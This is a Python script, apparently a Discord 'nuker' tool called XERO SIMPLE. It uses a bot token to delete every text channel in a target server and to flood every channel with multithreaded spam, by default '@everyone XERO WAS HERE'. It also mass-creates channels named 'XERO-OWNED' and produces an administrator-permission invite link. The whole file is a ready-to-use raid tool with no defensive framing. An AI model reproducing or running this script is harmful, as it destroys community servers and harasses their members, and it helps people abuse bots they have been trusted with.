
import os
import sys
import time
import json
import threading

try:
    import requests
except:
    os.system("pip3 install requests --break-system-packages")
    import requests

os.system("clear")

print("""
====================================
    XERO SIMPLE - iSH EDITION
       JUST WHAT YOU NEED
====================================
""")

token = input("[?] BOT TOKEN: ").strip()
if not token:
    print("[!] Token required!")
    sys.exit(1)

class XeroSimple:
    def __init__(self, guild_id, token):
        self.guild_id = guild_id
        self.token = token
        self.spamming = False
        self.spam_count = 0
        self.spam_threads = []
        self.headers = {"Authorization": f"Bot {self.token}"}

    def api_get(self, url):
        try:
            r = requests.get(url, headers=self.headers, timeout=10)
            return r
        except:
            return None

    def api_post(self, url, data=None):
        try:
            r = requests.post(url, headers=self.headers, json=data, timeout=10)
            return r
        except:
            return None

    def api_delete(self, url):
        try:
            r = requests.delete(url, headers=self.headers, timeout=10)
            return r
        except:
            return None

    def get_all_channels(self):
        r = self.api_get(f"https://discord.com/api/v10/guilds/{self.guild_id}/channels")
        if r and r.status_code == 200:
            return [c for c in r.json() if c['type'] == 0]
        return []

    def delete_all_channels(self):
        channels = self.get_all_channels()
        if not channels:
            print("[!] No channels found!")
            return
        
        print(f"\n[!] Deleting {len(channels)} channels...\n")
        
        deleted = 0
        for i, channel in enumerate(channels, 1):
            r = self.api_delete(f"https://discord.com/api/v10/channels/{channel['id']}")
            if r and r.status_code == 200:
                deleted += 1
                print(f"[+] Deleted: {channel['name']} ({i}/{len(channels)})")
            else:
                print(f"[-] Failed: {channel['name']}")
            time.sleep(0.3)
        
        print(f"\n[+] Deleted {deleted}/{len(channels)}")

    def spam_single_channel(self, channel_id, message):
        while self.spamming:
            try:
                r = self.api_post(
                    f"https://discord.com/api/v10/channels/{channel_id}/messages",
                    data={"content": message}
                )
                if r and r.status_code == 200:
                    self.spam_count += 1
                elif r and r.status_code == 429:
                    time.sleep(1)
                else:
                    time.sleep(0.5)
            except:
                time.sleep(0.5)

    def spam_all_channels(self, message):
        channels = self.get_all_channels()
        if not channels:
            print("[!] No channels found!")
            return
        
        print(f"\n[!] Spamming {len(channels)} channels...")
        print("[!] PRESS ENTER TO STOP\n")
        
        self.spam_threads = []
        for channel in channels:
            t = threading.Thread(target=self.spam_single_channel, args=(channel['id'], message))
            t.daemon = True
            t.start()
            self.spam_threads.append(t)

    def start_spam(self, message):
        if self.spamming:
            return
        self.spamming = True
        self.spam_count = 0
        threading.Thread(target=self.spam_all_channels, args=(message,), daemon=True).start()
        while self.spamming:
            sys.stdout.write(f"\r[!] Messages sent: {self.spam_count}")
            sys.stdout.flush()
            time.sleep(1)

    def stop_spam(self):
        self.spamming = False
        print(f"\n[!] Stopped. Total: {self.spam_count}")

    def create_channels(self, name, amount):
        print(f"\n[!] Creating {amount} channels...\n")
        
        created = 0
        for i in range(amount):
            channel_name = f"{name}-{i+1}" if amount > 1 else name
            r = self.api_post(
                f"https://discord.com/api/v10/guilds/{self.guild_id}/channels",
                data={"name": channel_name, "type": 0}
            )
            if r and r.status_code == 201:
                created += 1
                print(f"[+] {created}/{amount}: {channel_name}")
            else:
                print(f"[-] Failed: {channel_name}")
            time.sleep(0.5)
        
        print(f"\n[+] Created {created}/{amount}")

    def get_invite(self):
        r = self.api_get("https://discord.com/api/v10/oauth2/applications/@me")
        if r and r.status_code == 200:
            cid = r.json()['id']
            return f"https://discord.com/oauth2/authorize?client_id={cid}&permissions=8&scope=bot"
        return None

    def menu(self):
        while True:
            os.system("clear")
            print(f"""
====================================
    XERO SIMPLE - iSH EDITION
    TARGET: {self.guild_id}
====================================

  [1] DELETE ALL CHANNELS
  [2] SPAM ALL CHANNELS
  [3] CREATE CHANNELS
  [4] SHOW INVITE LINK
  [5] CHANGE TARGET
  [6] EXIT

====================================
            """)
            
            choice = input("[XERO] > ")

            if choice == "1":
                confirm = input("[!] ARE YOU SURE? (yes/no): ")
                if confirm.lower() == 'yes':
                    self.delete_all_channels()
                input("\n[PRESS ENTER]")
                
            elif choice == "2":
                message = input("[?] MESSAGE: ") or "@everyone XERO WAS HERE"
                self.start_spam(message)
                input()
                self.stop_spam()
                
            elif choice == "3":
                name = input("[?] NAME: ") or "XERO-OWNED"
                try:
                    amount = int(input("[?] HOW MANY: "))
                except:
                    amount = 20
                self.create_channels(name, amount)
                input("\n[PRESS ENTER]")
                
            elif choice == "4":
                invite = self.get_invite()
                if invite:
                    print(f"\n[+] INVITE LINK: {invite}")
                else:
                    print("\n[-] Failed to get invite link")
                input("\n[PRESS ENTER]")
                
            elif choice == "5":
                return "change"
                
            elif choice == "6":
                print("[!] BYE!")
                return "exit"

# تشغيل
os.system("clear")

try:
    r = requests.get(
        "https://discord.com/api/v10/users/@me",
        headers={"Authorization": f"Bot {token}"},
        timeout=10
    )
    if r.status_code == 200:
        info = r.json()
        print(f"[+] Connected as: {info['username']}\n")
    else:
        print("[-] Invalid token!")
        sys.exit(1)
except:
    print("[-] No internet or API blocked!")
    sys.exit(1)

while True:
    guild_id = input("[?] GUILD ID (or exit): ").strip()
    if guild_id.lower() == 'exit':
        sys.exit(0)
    if not guild_id.isdigit():
        print("[-] Invalid guild ID!")
        continue
    
    xero = XeroSimple(guild_id, token)
    result = xero.menu()
    if result == "exit":
        sys.exit(0)
